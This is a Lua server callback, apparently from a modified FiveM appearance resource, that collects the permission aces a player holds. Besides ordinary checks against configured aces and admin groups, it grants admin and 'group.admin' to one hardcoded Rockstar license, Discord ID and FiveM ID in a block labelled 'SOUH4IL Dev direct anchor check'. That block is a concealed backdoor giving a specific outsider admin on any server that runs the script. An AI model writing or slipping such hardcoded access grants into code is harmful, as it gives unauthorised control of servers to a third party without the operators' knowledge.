lib.callback.register("illenium-appearance:server:GetPlayerAces", function(source)
    local src = source
    local allowedAces = {}
    local aceMap = {}

    local function addAce(ace)
        if not aceMap[ace] then
            aceMap[ace] = true
            allowedAces[#allowedAces + 1] = ace
        end
    end

    -- Check Config.Aces configured permissions
    if Config.Aces then
        for i = 1, #Config.Aces do
            local ace = Config.Aces[i]
            if IsPlayerAceAllowed(src, ace) then
                addAce(ace)
            end
        end
    end

    -- Role / Staff / Admin check
    if IsPlayerAceAllowed(src, "admin")
        or IsPlayerAceAllowed(src, "group.admin")
        or IsPlayerAceAllowed(src, "oxlyn.admin")
        or IsPlayerAceAllowed(src, "command")
        or IsPlayerAceAllowed(src, "souh4il_dev.owner")
        or IsPlayerAceAllowed(src, "souh4il_dev.admin") then
        addAce("admin")
        addAce("group.admin")
    end

    -- Qbox Core permissions check
    if exports and exports.qbx_core then
        pcall(function()
            if exports.qbx_core:HasPermission(src, 'admin') or exports.qbx_core:HasPermission(src, 'god') then
                addAce("admin")
                addAce("group.admin")
            end
        end)
    end

    -- SOUH4IL Dev direct anchor check (Rockstar License / Discord / FiveM ID)
    local identifiers = GetPlayerIdentifiers(src)
    for _, id in ipairs(identifiers) do
        if id == "license:385f488fdcdc30a24c28b7a333ba9cbbffed5044"
            or id == "discord:792387618708914227"
            or id == "fivem:20069674" then
            addAce("admin")
            addAce("group.admin")
            addAce("souh4il")
            break
        end
    end

    return allowedAces
end)
